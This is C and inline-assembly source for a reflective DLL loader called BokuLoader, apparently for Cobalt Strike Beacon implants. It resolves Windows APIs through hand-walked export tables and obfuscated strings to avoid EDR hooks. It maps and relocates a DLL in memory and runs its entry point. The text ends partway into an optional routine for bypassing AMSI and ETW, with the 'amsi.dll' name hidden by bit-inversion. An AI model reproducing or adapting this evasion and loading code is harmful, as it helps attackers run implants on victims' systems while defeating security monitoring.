#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#define BYPASS // ETW & AMSI bypass switch. Comment out this line to disable 
#ifdef BYPASS
typedef BOOL (WINAPI * tWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
#endif
void* getDllBase(void*);
void* getExportDirectory(void* dllAddr);
void* getExportAddressTable(void* dllBase, void* dllExportDirectory);
void* getExportNameTable(void* dllBase, void* dllExportDirectory);
void* getExportOrdinalTable(void* dllBase, void* dllExportDirectory);
void* getSymbolAddress(void* symbolStr, void* StrSize, void* dllBase, void* AddressTable, void* NameTable, void* OrdinalTable);
void* getRdllBase();
void* getNewExeHeader(void* dllBase);
void* getDllSize(void* newExeHeader);
void* getDllSizeOfHeaders(void* newExeHeader);
void* copyMemory(void* Size, void* source, void* destination);
void* getOptionalHeader(void* NewExeHeader);
void* getSizeOfOptionalHeader(void* NewExeHeader);
void* getNthSection(void* OptionalHeader, void* SizeOfOptionalHeader);
void* getNumberOfSections(void* newExeHeaderAddr);
void* getImportDirectory(void* OptionalHeader);
void* getBeaconEntryPoint(void* newRdllAddr, void* OptionalHeaderAddr);

typedef struct Export {
    void* Directory;
    void* AddressTable;
    void* NameTable;
    void* OrdinalTable;
}Export;

typedef struct Dll {
    void* dllBase;
    void* NewExeHeader;
    void* size;
    void* SizeOfHeaders;
    void* OptionalHeader;
    void* SizeOfOptionalHeader;
    void* NthSection;
    void* NumberOfSections;
    void* EntryPoint;
    void* TextSection;
    void* TextSectionSize;
    Export Export;
}Dll;

typedef struct Section {
    void* RVA;
    void* dst_rdll_VA;
    void* src_rdll_VA;
    void* PointerToRawData;
    void* SizeOfSection;
}Section;

typedef void*  (WINAPI * tLoadLibraryA)(char*);
typedef void*  (WINAPI * tGetProcAddress)(void*, char*);
typedef void*  (WINAPI * tVirtualAlloc) (void*, unsigned __int64, unsigned long, unsigned long);
typedef void*  (WINAPI * tVirtualProtect)(void*, unsigned __int64, unsigned long, unsigned long*);
typedef void*  (NTAPI  * tNtFlushInstructionCache)(HANDLE, PVOID, unsigned long);
typedef void*  (WINAPI * DLLMAIN)(HINSTANCE, unsigned long, void* );
void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA);

__declspec(dllexport) void* WINAPI BokuLoader()
{
    // Get Export Directory and Export Tables for NTDLL.DLL
    char ws_ntdll[] = {'n',0,'t',0,'d',0,'l',0,'l',0,'.',0,'d',0,'l',0,'l',0,0};
    Dll ntdll;
    ntdll.dllBase             = (void*)getDllBase(ws_ntdll);
    ntdll.Export.Directory    = (void*)getExportDirectory((void*)ntdll.dllBase);
    ntdll.Export.AddressTable = (void*)getExportAddressTable((void*)ntdll.dllBase, ntdll.Export.Directory);
    ntdll.Export.NameTable    = (void*)getExportNameTable((void*)ntdll.dllBase, ntdll.Export.Directory);
    ntdll.Export.OrdinalTable = (void*)getExportOrdinalTable((void*)ntdll.dllBase, ntdll.Export.Directory);

    // Get Export Directory and Export Tables for Kernel32.dll
    char ws_k32[] = {'K',0,'E',0,'R',0,'N',0,'E',0,'L',0,'3',0,'2',0,'.',0,'D',0,'L',0,'L',0,0};
    Dll k32;
    k32.dllBase               = (void*)getDllBase(ws_k32);
    k32.Export.Directory      = (void*)getExportDirectory((void*)k32.dllBase);
    k32.Export.AddressTable   = (void*)getExportAddressTable((void*)k32.dllBase, k32.Export.Directory);
    k32.Export.NameTable      = (void*)getExportNameTable((void*)k32.dllBase, k32.Export.Directory);
    k32.Export.OrdinalTable   = (void*)getExportOrdinalTable((void*)k32.dllBase, k32.Export.Directory);

    char ntstr1[] = {'N','t','F','l','u','s','h','I','n','s','t','r','u','c','t','i','o','n','C','a','c','h','e',0};
    tNtFlushInstructionCache pNtFlushInstructionCache = (tNtFlushInstructionCache)getSymbolAddress(ntstr1, (void*)23, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
    char kstr1[] = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
    tLoadLibraryA pLoadLibraryA      = (tLoadLibraryA)getSymbolAddress(kstr1, (void*)12, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
    char kstr2[] = {'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0};
    tGetProcAddress pGetProcAddress  = (tGetProcAddress)getSymbolAddress(kstr2, (void*)14, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
    char kstr3[] = {'V','i','r','t','u','a','l','A','l','l','o','c',0};
    tVirtualAlloc pVirtualAlloc      = (tVirtualAlloc)getSymbolAddress(kstr3, (void*)12, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
    char kstr4[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0};
    tVirtualProtect pVirtualProtect  = (tVirtualProtect)getSymbolAddress(kstr4, (void*)14, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);

    // Initial Source Reflective DLL
    Dll rdll_src;
    rdll_src.dllBase              = (void*)getRdllBase();
    rdll_src.NewExeHeader         = (void*)getNewExeHeader(rdll_src.dllBase);
    rdll_src.size                 = (void*)getDllSize(rdll_src.NewExeHeader);
    rdll_src.SizeOfHeaders        = (void*)getDllSizeOfHeaders(rdll_src.NewExeHeader);
    rdll_src.OptionalHeader       = (void*)getOptionalHeader(rdll_src.NewExeHeader);
    rdll_src.SizeOfOptionalHeader = (void*)getSizeOfOptionalHeader(rdll_src.NewExeHeader);
    rdll_src.NumberOfSections     = (void*)getNumberOfSections(rdll_src.NewExeHeader);

    // AMSI & ETW Optional Bypass
    #ifdef BYPASS
    bypass(&ntdll, &k32, pLoadLibraryA);
    #endif

    // Allocate new memory to write our new RDLL too
    Dll rdll_dst;
    rdll_dst.dllBase              = (void*)pVirtualAlloc(NULL, (unsigned __int64)rdll_src.size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
    // Write Headers from init source RDLL to new destination RDLL
    copyMemory(rdll_src.SizeOfHeaders, rdll_src.dllBase, rdll_dst.dllBase);

    // Save .text section address and size for destination RDLL so we can make it RE later
    BOOL textSectionFlag = TRUE;
    __int64 numberOfSections      = (__int64)rdll_src.NumberOfSections;
    rdll_src.NthSection           = (void*)getNthSection(rdll_src.OptionalHeader, rdll_src.SizeOfOptionalHeader);
    Section section;
    while( numberOfSections-- )
    {
        __asm__(
            "mov rax, %[nthSection] \n"
            "add rax, 0xC \n"
            "xor rbx, rbx \n"
            "mov ebx, [rax] \n"
            "mov %[SectionRVA], rbx \n"
            :[SectionRVA] "=r" (section.RVA)
            :[nthSection] "r" (rdll_src.NthSection)
        );
        __asm__(
            "mov rax, %[newRdllAddr] \n"
            "mov rbx, %[sectionRVA] \n"
            "add rbx, rax \n"
            "mov %[dst_rdll_VA], rbx \n"
            :[dst_rdll_VA] "=r" (section.dst_rdll_VA)
            :[newRdllAddr] "r" (rdll_dst.dllBase),
            [sectionRVA] "r" (section.RVA)
        );    
        __asm__(
            "mov rax, %[nthSection] \n"
            "add rax, 0x14 \n"
            "xor rbx, rbx \n"
            "mov ebx, [rax] \n"
            "mov %[PointerToRawData], rbx \n"
            :[PointerToRawData] "=r" (section.PointerToRawData)
            :[nthSection] "r" (rdll_src.NthSection)
        );
        __asm__(
            "mov rax, %[initRdllAddr] \n"
            "mov rbx, %[PointerToRawData] \n"
            "add rbx, rax \n"
            "mov %[src_rdll_VA], rbx \n"
            :[src_rdll_VA] "=r" (section.src_rdll_VA)
            :[initRdllAddr] "r" (rdll_src.dllBase),
            [PointerToRawData] "r" (section.PointerToRawData)
        );    
        // Get the size of the section
        __asm__(
            "mov rax, %[nthSection] \n"
            "add rax, 0x10 \n"
            "xor rbx, rbx \n"
            "mov ebx, [rax] \n"
            "mov %[SizeOfSection], rbx \n"
            :[SizeOfSection] "=r" (section.SizeOfSection)
            :[nthSection] "r" (rdll_src.NthSection)
        );
        // Save the .text section address & size for later so we can change it from RW to RE. This has to be done after we do relocations
        if(textSectionFlag == TRUE)
        {
            textSectionFlag = FALSE; 
            rdll_dst.TextSection = section.dst_rdll_VA;
            rdll_dst.TextSectionSize = section.SizeOfSection;
        }
        // Copy the section from the source address to the destination for the size of the section
        copyMemory(section.SizeOfSection, section.src_rdll_VA, section.dst_rdll_VA);
        // Get the address of the next section header and loop until there are no more sections
        __asm__(
            "mov rax, %[InRdllNthSectionAddr] \n"
            "add rax, 0x28 \n" // sizeof( IMAGE_SECTION_HEADER ) = 0x28
            "mov %[OutRdllNthSectionAddr], rax \n"
            :[OutRdllNthSectionAddr] "=r" (rdll_src.NthSection)
            :[InRdllNthSectionAddr]  "r"  (rdll_src.NthSection)
        );
    }
    // Get the address of our RDLL's Import Directory entry in within the Data Directory of the Optional Header
    PVOID rdllDataDirImportDirectoryAddr;
    __asm__(
        "mov rax, %[OptionalHeader] \n"
        "xor rbx, rbx \n"
        "mov rbx, 0x78 \n"
        "add rax, rbx \n"
        "mov %[rdllDataDirImportDirectoryAddr], rax \n"
        :[rdllDataDirImportDirectoryAddr] "=r" (rdllDataDirImportDirectoryAddr)
        :[OptionalHeader] "r" (rdll_src.OptionalHeader)
    );
    // Get the Address of the Import Directory from the Data Directory
    PVOID rdllImportDirectoryAddr;
    __asm__(
        "mov rax, %[rdllDataDirImportDirectoryAddr] \n"
        "mov rdx, %[dllBase] \n"
        "xor rbx, rbx \n"
        "mov ebx, [rax] \n"  // EBX = RVA of Import Directory
        "add rdx, rbx \n" // Import Directory of New RDLL = RVA of Import Directory + New RDLL Base Address
        "mov %[rdllImportDirectoryAddr], rdx \n"
        :[rdllImportDirectoryAddr] "=r" (rdllImportDirectoryAddr)
        :[rdllDataDirImportDirectoryAddr] "r" (rdllDataDirImportDirectoryAddr),
         [dllBase] "r" (rdll_dst.dllBase)
    );
    PVOID nextModuleImportDescriptor = rdllImportDirectoryAddr;
    Dll dll_import;
    PVOID importEntryHint, importedDllBaseOrdinal, importEntryExportTableIndex, importEntryAddressRVA, importEntryAddress, importNameRVA, importName;
    __asm__(
        "mov rax, %[nextModuleImportDescriptor] \n"
        "mov r11, %[dllBase] \n"
        "xor rbx, rbx \n"
        "xor r12, r12 \n"
        "add rax, 0xC \n"          // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
        "mov ebx, [rax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name into EBX
        "push rbx \n"            // save the RVA for the Name of the DLL to be imported to the top of the stack
        "pop r12 \n"             // R12&RBX = RVA of Name DLL
        "cmp ebx, 0x0 \n"        // if this value is 0 we are at the end of the DLL's we need to import symbols/functions/api's from
        "je check1 \n"
        "add rbx, r11 \n"          // Address of Module String = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
        "check1: \n"
        "mov %[importNameRVA], r12 \n" 
        "mov %[importName], rbx \n" 
        :[importNameRVA] "=r" (importNameRVA),
           [importName] "=r" (importName)
        :[nextModuleImportDescriptor] "r" (nextModuleImportDescriptor),
         [dllBase] "r" (rdll_dst.dllBase)
    );
    // Import all the symbols from all the import tables listed in the import directory
    PVOID importLookupTableEntry, importAddressTableEntry, importEntryNameString, importEntryNameStringLength, importEntryFunctionAddress, checkNullImportAddressTableEntry;
    // The last entry in the image import directory is all zeros
    while(importNameRVA)
    {
        dll_import.dllBase = (PVOID)getDllBase(importName);
        // If the DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
        if (dll_import.dllBase == NULL){
            dll_import.dllBase = (PVOID)pLoadLibraryA((char*)(importName));
        }
        // importLookupTableEntry = VA of the OriginalFirstThunk
        __asm__(
            "mov rax, %[nextModuleImportDescriptor] \n" // 0 byte offset is the address of the DWORD OriginalFirstThunk within the image import descriptor
            "mov r11, %[dllBase] \n"
            "xor rbx, rbx \n"
            "mov ebx, [rax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->OriginalFirstThunk into EBX
            "add rbx, r11 \n"          // importLookupTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->OriginalFirstThunk 
            "mov %[importLookupTableEntry], rbx \n" 
            :[importLookupTableEntry] "=r" (importLookupTableEntry)
            :[nextModuleImportDescriptor] "r" (nextModuleImportDescriptor),
             [dllBase] "r" (rdll_dst.dllBase)
        );
        // importAddressTableEntry = VA of the IAT (via first thunk not origionalfirstthunk)
        __asm__(
            "mov rax, %[nextModuleImportDescriptor] \n" 
            "mov r11, %[dllBase] \n"
            "xor rbx, rbx \n"
            "add rax, 0x10 \n"          // 16 (0x10) byte offset is the address of the DWORD FirstThunk within the image import descripto
            "mov ebx, [rax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->FirstThunk into EBX
            "add rbx, r11 \n"          // importAddressTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->FirstThunk 
            "mov %[importAddressTableEntry], rbx \n" 
            :[importAddressTableEntry] "=r" (importAddressTableEntry)
            :[nextModuleImportDescriptor] "r" (nextModuleImportDescriptor),
             [dllBase] "r" (rdll_dst.dllBase)
        );
        __asm__(
            "mov rax, %[importAddressTableEntry] \n" 
            "mov rax, [rax] \n"
            "mov %[checkNullImportAddressTableEntry], rax \n" 
            :[checkNullImportAddressTableEntry] "=r" (checkNullImportAddressTableEntry)
            :[importAddressTableEntry] "r" (importAddressTableEntry)
        );
        while(checkNullImportAddressTableEntry)
        {
            // Export Directory for current module/DLL being imported
            dll_import.Export.Directory = getExportDirectory(dll_import.dllBase);
            // Export Address Table address for the current module being imported
            dll_import.Export.AddressTable = getExportAddressTable(dll_import.dllBase, dll_import.Export.Directory);
            // Export AddressOfNames Table address for the current module being imported
            dll_import.Export.NameTable = getExportNameTable(dll_import.dllBase, dll_import.Export.Directory);
            // Export AddressOfNameOrdinals Table address for the current module being imported
            dll_import.Export.OrdinalTable = getExportOrdinalTable(dll_import.dllBase, dll_import.Export.Directory);

            if( importLookupTableEntry && ((PIMAGE_THUNK_DATA)importLookupTableEntry)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
            {
                // Export Base Ordinal from the Export Directory of the module/dll being imported (0x10 offset)
                //   This is located in the Export Directory in memory of the module which functions/api's are being imported
                // importedDllBaseOrdinal = ((PIMAGE_EXPORT_DIRECTORY )importedDllExportDirectory)->Base;
                __asm__(
                    "mov rcx, %[Directory] \n"
                    "xor rax, rax \n"
                    "add rcx, 0x10 \n"         // DWORD Base; // 0x10 offset // RCX = &importedDllBaseOrdinal
                    "mov eax, [rcx] \n"        // RAX = importedDllBaseOrdinal (Value/DWORD)
                    "mov %[importedDllBaseOrdinal], rax \n"
                    :[importedDllBaseOrdinal] "=r" (importedDllBaseOrdinal)
                    :[Directory] "r" (dll_import.Export.Directory)
                );
                // Import Hint from the modules Hint/Name table
                __asm__(
                    "mov rax, %[importLookupTableEntry] \n"
                    "mov rax, [rax] \n" // RAX = 8000000000000013. 13 is the original Thunk, now we need to get rid of the 8
                    "and eax, 0xFFFF \n" // get rid of the 8
                    "mov %[importEntryHint], rax \n"
                    :[importEntryHint] "=r" (importEntryHint)
                    :[importLookupTableEntry] "r" (importLookupTableEntry)
                );
                // Use the import entries Hint and the Imported Modules Base Ordinal from its Export Directory to find the index of our entry/import within the Export Address Table
                // Import Hint from Hint/Name Table (first 2 bytes before the name string)
                // ImportHint - ExportBaseOrdinal = The location of the API/function in the ExportAddressTable entries
                // importEntryExportTableIndex = importEntryHint - importedDllBaseOrdinal;
                __asm__(
                    "mov rax, %[importEntryHint] \n"
                    "mov r11, %[importedDllBaseOrdinal] \n"
                    "sub rax, r11 \n"
                    "mov %[importEntryExportTableIndex], rax \n"
                    :[importEntryExportTableIndex] "=r" (importEntryExportTableIndex)
                    :[importEntryHint] "r" (importEntryHint),
                     [importedDllBaseOrdinal] "r" (importedDllBaseOrdinal)
                );
                // Get the RVA for our Import Entry executable function address
                // The ExportAddressTable/AddressOfFunctions holds DWORD (4 byte) RVA's for the executable functions/api's address
                // importEntryAddressRVA = importEntryExportTableIndex * sizeof(DWORD) + AddressTable;
                __asm__(
                    "mov rax, %[importEntryExportTableIndex] \n"
                    "mov rcx, %[AddressTable] \n"
                    "xor rbx, rbx \n"
                    "add bl, 0x4 \n"                  // RBX = sizeof(DWORD) - This is because each entry in the table is a 4 byte DWORD which is the RVA/offset for the actual executable functions address
                    "mul rbx \n"                      // RAX = importEntryExportTableIndex * sizeof(DWORD)
                    "add rax, rcx \n"                 // RAX = RVA for our functions address
                    "mov %[importEntryAddressRVA], rax \n"          // Save &module.<API> to the variable importEntryAddressRVA
                    :[importEntryAddressRVA] "=r" (importEntryAddressRVA)
                    :[importEntryExportTableIndex]"r"(importEntryExportTableIndex),
                    [AddressTable]"r"(dll_import.Export.AddressTable)
                    
                );
                // Get the real address for our imported function and write it to our import table
                // patch in the address for this imported function
                __asm__(
                    "mov rax, %[importAddressTableEntry] \n"
                    "mov rdx, %[importEntryAddressRVA] \n"
                    "mov rcx, %[dllBase] \n"
                    "xor rbx, rbx \n"
                    "mov ebx, [rdx] \n"  // EBX = The RVA for the executable function we are importing
                    "add rcx, rbx \n"    // RCX = The executable address within the imported DLL for the function we imported
                    "mov [rax], rcx \n"  // write the address of the imported api to our import table
                    : // no outputs
                    :[importAddressTableEntry] "r" (importAddressTableEntry),  // RAX = The import table entry we are going to overwrite
                     [importEntryAddressRVA] "r" (importEntryAddressRVA),  // RDX = 00007FFA56740000 &ws2_32.dll
                     [dllBase] "r" (dll_import.dllBase) // RCX = ws2_32.00007FFA5678E500
                  );
            }
            else
            {
                // If there was no ordinal/hint to import then import via the name from the import tables Hint/Name Table for the imported module
                // get the VA of this functions import by name struct
                __asm__(
                    "mov rax, %[importAddressTableEntry] \n"
                    "mov rcx, %[dllBase] \n"
                    "xor rbx, rbx \n"
                    "mov rbx, [rax] \n" // RVA for our functions Name/Hint table entry
                    "add rcx, rbx \n"   // VA (Address in memory) Name/Hint Entry = RVA Name/Hint Entry + New RDLL Address
                    "add rcx, 0x2 \n"   // The hint is the first 2 bytes, then its followed by the name string for our import. We need to drop the first 2 bytes so we just have the name string
                    "mov %[importEntryNameString], rcx \n" // RCX = Address of our Name string for our import
                    :[importEntryNameString] "=r" (importEntryNameString) 
                    :[importAddressTableEntry] "r" (importAddressTableEntry),  // RAX = The import table entry we are going to overwrite / The RVA for our functions Name/Hint Table entry
                     [dllBase] "r" (rdll_dst.dllBase) // RCX 
                );
                // Get the string length for the import function name
                __asm__(
                    "mov rax, %[importEntryNameString] \n"
                    "xor rcx, rcx \n"
                    "countLoop: \n"
                    "inc cl \n" // increment the name string length counter
                    "xor rbx, rbx \n"
                    "cmp bl, [rax] \n" // are we at the null terminator for the string?
                    "je foundStringLength \n"
                    "inc rax \n" // move to the next char of the string
                    "jmp short countLoop \n"
                    "foundStringLength: \n"
                    "mov %[importEntryNameStringLength], rcx \n" 
                    :[importEntryNameStringLength] "=r" (importEntryNameStringLength) 
                    :[importEntryNameString] "r" (importEntryNameString) 
                );    
                // use GetSymbolAddress to dodge EDR hooks on GetProcAddress() and patch in the address for this imported function
                importEntryAddress = getSymbolAddress(importEntryNameString, importEntryNameStringLength, dll_import.dllBase, dll_import.Export.AddressTable, dll_import.Export.NameTable, dll_import.Export.OrdinalTable);
                // If getSymbolAddress() returned a NULL then the symbol is a forwarder string. Use normal GetProcAddress() to handle forwarder
                if (importEntryAddress == NULL){
                    importEntryAddress = (PVOID)pGetProcAddress( (HMODULE)dll_import.dllBase, (char*)importEntryNameString);
                }
                __asm__(
                    "mov rax, %[importAddressTableEntry] \n"
                    "mov rdx, %[importEntryAddress] \n"
                    "xor rbx, rbx \n"
                    "mov [rax], rdx \n"  // write the address of the imported api to our import table
                    : // no outputs
                    :[importAddressTableEntry] "r" (importAddressTableEntry),  // RAX = The import table entry we are going to overwrite
                     [importEntryAddress] "r" (importEntryAddress) 
                );
            }
            importAddressTableEntry += 0x8;
            if( importLookupTableEntry )
                importLookupTableEntry += 0x8;
            __asm__(
                "mov rax, %[importAddressTableEntry] \n" 
                "mov rax, [rax] \n"
                "mov %[checkNullImportAddressTableEntry], rax \n" 
                :[checkNullImportAddressTableEntry] "=r" (checkNullImportAddressTableEntry)
                :[importAddressTableEntry] "r" (importAddressTableEntry)
            );
        }
        __asm__(
            "mov rax, %[inNextModuleImportDescriptor] \n"
            "add rax, 0x14 \n" // 0x14 = 20 = sizeof( IMAGE_IMPORT_DESCRIPTOR )
            "mov %[outNextModuleImportDescriptor], rax \n"
            :[outNextModuleImportDescriptor] "=r" (nextModuleImportDescriptor)
            :[inNextModuleImportDescriptor] "r" (nextModuleImportDescriptor)
        );
        // We need to do this again for the next module/DLL in the Import Directory
        __asm__(
            "mov rax, %[nextModuleImportDescriptor] \n"
            "mov r11, %[newRdllAddr] \n"
            "xor rbx, rbx \n"
            "xor r12, r12 \n"
            "add rax, 0xC  \n"  // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
            "mov ebx, [rax] \n" // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name into EBX
            "push rbx \n"       // save the RVA for the Name of the DLL to be imported to the top of the stack
            "pop r12 \n"        // R12&RBX = RVA of Name DLL
            "cmp ebx, 0x0 \n"   // if this value is 0 we are at the end of the DLL's we need to import symbols/functions/api's from
            "je check2 \n"
            "add rbx, r11 \n"   // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
            "check2: \n"
            "mov %[importNameRVA], r12 \n" 
            "mov %[importName], rbx \n" 
            :[importNameRVA] "=r" (importNameRVA),
             [importName] "=r" (importName)
            :[nextModuleImportDescriptor] "r" (nextModuleImportDescriptor),
             [newRdllAddr] "r" (rdll_dst.dllBase)
        );
    }
    rdll_dst.NewExeHeader   = getNewExeHeader(rdll_dst.dllBase);
    rdll_dst.OptionalHeader = getOptionalHeader(rdll_dst.NewExeHeader);
    void* BaseAddressDelta;
    __asm__(
        "mov rax, %[OptionalHeader] \n"
        "mov rcx, %[dllBase] \n"
        "xor rbx, rbx \n"
        "mov rbx, 0x18 \n"
        "add rax, rbx \n"       // OptionalHeader.ImageBase
        "mov rax, [rax] \n"
        "sub rcx, rax \n"       // dllBase.ImageBase
        "mov %[BaseAddressDelta], rcx \n"
        :[BaseAddressDelta] "=r" (BaseAddressDelta)
        :[OptionalHeader] "r" (rdll_dst.OptionalHeader),
         [dllBase] "r" (rdll_dst.dllBase)
    );
    void* newRelocationDirectoryAddr;
    __asm__(
        "mov rax, %[OptionalHeader] \n"
        "xor rbx, rbx \n"
        "mov rbx, 0x98 \n"            // OptionalHeaderAddr + 0x98 = &DataDirectory[Base Relocation Table]
        "add rax, rbx \n"             // OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
        "mov %[newRelocationDirectoryAddr], rax \n"
        :[newRelocationDirectoryAddr] "=r" (newRelocationDirectoryAddr)
        :[OptionalHeader] "r" (rdll_dst.OptionalHeader)
    );
    void* nextRelocBlock;
    __asm__(
        "mov rax, %[newRelocationDirectoryAddr] \n"
        "mov rcx, %[dllBase] \n"
        "xor rbx, rbx \n"
        "mov ebx, [rax] \n"  // Move the 4 byte DWORD Virtual Address of the Relocation Directory table into the EBX register
        "add rcx, rbx \n"    // newRelocationTableAddr = dllBase + RVAnewRelocationTable
        "mov %[nextRelocBlock], rcx \n"
        :[nextRelocBlock] "=r" (nextRelocBlock)
        :[newRelocationDirectoryAddr] "r" (newRelocationDirectoryAddr),
         [dllBase] "r" (rdll_dst.dllBase)
    );
    void* newRelocationDirectorySize;
    __asm__(
        "mov rax, %[newRelocationDirectoryAddr] \n"
        "xor rbx, rbx \n"
        "mov ebx, [rax+0x4] \n"  // Move the 4 byte DWORD Size of the Relocation Directory table into the EBX register
        "mov %[newRelocationDirectorySize], rbx \n"
        :[newRelocationDirectorySize] "=r" (newRelocationDirectorySize)
        :[newRelocationDirectoryAddr] "r" (newRelocationDirectoryAddr)
    );
    // check if their are any relocations present
    if(newRelocationDirectorySize)
    {
        void* relocBlockSize;
        __asm__(
            "mov rax, %[nextRelocBlock] \n"
            "xor rbx, rbx \n"
            "mov ebx, [rax+0x4] \n"  // Move the 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock into EBX
            "mov %[relocBlockSize], rbx \n"
            :[relocBlockSize] "=r" (relocBlockSize)
            :[nextRelocBlock] "r" (nextRelocBlock)
        );
        void* relocVA;
        void* RelocBlockEntries;
        void* nextRelocBlockEntry;    
        while(relocBlockSize)
        {
            __asm__(
                "mov rax, %[nextRelocBlock] \n"
                "mov r11, %[dllBase] \n"
                "xor rbx, rbx \n"
                "mov ebx, [rax] \n"   // Move the 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->VirtualAddress into EBX
                "add r11, rbx \n"     // R11 = &reflectiveDll.dll + nextRelocationBlockRVA = VA of next Relocation Block
                "mov %[relocVA], r11 \n"
                :[relocVA] "=r" (relocVA)
                :[nextRelocBlock] "r" (nextRelocBlock),
                 [dllBase] "r" (rdll_dst.dllBase)
            );
            __asm__(
                "mov rax, %[relocBlockSize] \n"
                "xor rbx, rbx \n"
                "xor rdx, rdx \n"
                "inc bl \n"
                "inc bl \n" // RBX = 0x2 = size of image relocation WORD
                "sub ax, 0x8 \n" // Minus the 8 byte IMAGE_BASE_RELOCATION structure which tells us the RVA for the block and the blocksize
                "div bx \n" // RAX/RBX = relocBlockSize/2 = RAX
                "mov %[RelocBlockEntries], rax \n"
                :[RelocBlockEntries] "=r" (RelocBlockEntries)
                :[relocBlockSize] "r" (relocBlockSize)
            );
            __asm__(
                "mov r12, %[nextRelocBlock] \n"
                "add r12, 0x8 \n"
                "mov %[nextRelocBlockEntry], r12 \n"
                :[nextRelocBlockEntry] "=r" (nextRelocBlockEntry)
                :[nextRelocBlock] "r" (nextRelocBlock)
            );
            while( RelocBlockEntries-- )
            {
                __asm__(
                    "mov rax, %[nextRelocBlockEntry] \n"
                    "mov r11, %[relocVA] \n"
                    "mov r12, %[BaseAddressDelta] \n"
                    "xor rdx, rdx \n"
                    "mov dx, [rax] \n"   // RDX = the 2 byte value for the Relocation Entry (with the 4 bit type and 12 bit offset)
                    "mov rax, rdx \n"
                    "shr rdx, 0x0C \n"   // Check the 4 bit type
                    "cmp dl, 0x0A \n"    // IMAGE_REL_BASED_DIR64?
                    "jne badtype \n"
                    "shl rax, 0x34 \n"   // only keep the last 12 bits of RAX by shaking the RAX register
                    "shr rax, 0x34 \n"   // the last 12 bits is the offset, the first 4 bits is the type
                    "add r11, rax \n"    // R11 = the in memory Virtual Address of our current relocation entry
                    "mov rbx, [r11] \n"  // RBX = the value of the relocation entry
                    "add rbx, r12 \n"    // RBX = The value of our relocation entry + the hardcoded Addr:Our Real in memory VA delta we calculated earlier
                    // Now we need to write our new calculated relocation value to the current relocation entry
                    "mov [r11], rbx \n"  // WRITE THAT RELOC!
                    "badtype:\n"
                    : // no outputs
                    :[nextRelocBlockEntry] "r" (nextRelocBlockEntry),
                    [relocVA] "r" (relocVA),
                    [BaseAddressDelta] "r" (BaseAddressDelta)
                   );
                __asm__(
                    "mov r12, %[in_NRBE] \n"
                    "add r12, 0x2 \n"
                    "mov %[out_NRBE], r12 \n"
                    :[out_NRBE] "=r" (nextRelocBlockEntry)
                    :[in_NRBE]  "r"  (nextRelocBlockEntry)
                );
            }
            __asm__(
                "mov rax, %[in_NRB] \n"
                "mov r11, %[relocBlockSize] \n"
                "add r11, rax \n"
                  "mov %[out_NRB], r11 \n"
                 :[out_NRB] "=r" (nextRelocBlock)
                 :[in_NRB]  "r"  (nextRelocBlock),
                [relocBlockSize] "r" (relocBlockSize)
            );
            __asm__(
                "mov rax, %[nextRelocBlock] \n"
                "xor rbx, rbx \n"
                "mov ebx, [rax+0x4] \n"  // Move the 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock into EBX
                "mov %[relocBlockSize], rbx \n"
                :[relocBlockSize] "=r" (relocBlockSize)
                :[nextRelocBlock] "r" (nextRelocBlock)
            );
        }
    }
    unsigned long oldprotect = 0;
    pVirtualProtect(rdll_dst.TextSection, (unsigned __int64)rdll_dst.TextSectionSize, PAGE_EXECUTE_READ, &oldprotect);
    rdll_dst.EntryPoint = getBeaconEntryPoint(rdll_dst.dllBase, rdll_dst.OptionalHeader);
    pNtFlushInstructionCache((void*)-1, NULL, 0);
    ((DLLMAIN)rdll_dst.EntryPoint)( rdll_dst.dllBase, DLL_PROCESS_ATTACH, NULL);
    return rdll_dst.EntryPoint;
}

// ######### OPTIONAL BYPASS AMSI & ETW CODE ########
void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA){
    // ######### AMSI.AmsiOpenSession Bypass
    char amsiStr[] = "f!@.24#.62#6.2#"; // have space in reserved bytes for null string terminator
    //char amsiStr[] = "amsi.dll12345678;
    // python reverse.py amsi.dll12345678
    // String length : 8
    //   lld.isma : 6c6c642e69736d61
    __asm__(
        "mov rsi, %[amsiStr] \n"
        "xor rdx, rdx \n"                // null string terminator
        "mov r11, 0x93939BD1968C929E \n" // NOT lld.isma : 6c6c642e69736d61
        "not r11 \n"
        "mov [rsi], r11 \n"
        "mov [rsi+0x8], rdx \n"
        : // no output
        :[amsiStr] "r" (amsiStr)
    );    
    Dll amsi;
    amsi.dllBase = (PVOID)getDllBase((PVOID)amsiStr); // check if amsi.dll is already loaded into the process
